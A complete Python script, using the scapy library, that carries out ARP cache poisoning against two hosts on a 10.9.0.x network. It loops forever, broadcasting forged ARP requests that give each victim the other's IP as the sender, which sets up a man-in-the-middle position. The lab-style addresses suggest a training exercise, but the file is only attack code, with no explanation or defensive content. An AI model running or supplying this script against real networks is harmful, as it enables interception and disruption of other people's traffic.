# flake8: noqa
from scapy.all import ARP, Ether, sendp
from time import sleep
from sys import exit

IP_A = "10.9.0.5"
IP_B = "10.9.0.6"

def arp_poison():
    try:
        while True:
            pkt_A = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=IP_A, psrc=IP_B)
            pkt_B = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op=1, pdst=IP_B, psrc=IP_A)
            sendp(pkt_A)
            sendp(pkt_B)
            sleep(5)

    except KeyboardInterrupt:
        print('\n[*] Shutting down...')
        print('[*] Exiting...')
        exit(1)

def main():
    arp_poison()

if __name__ == '__main__':
    main()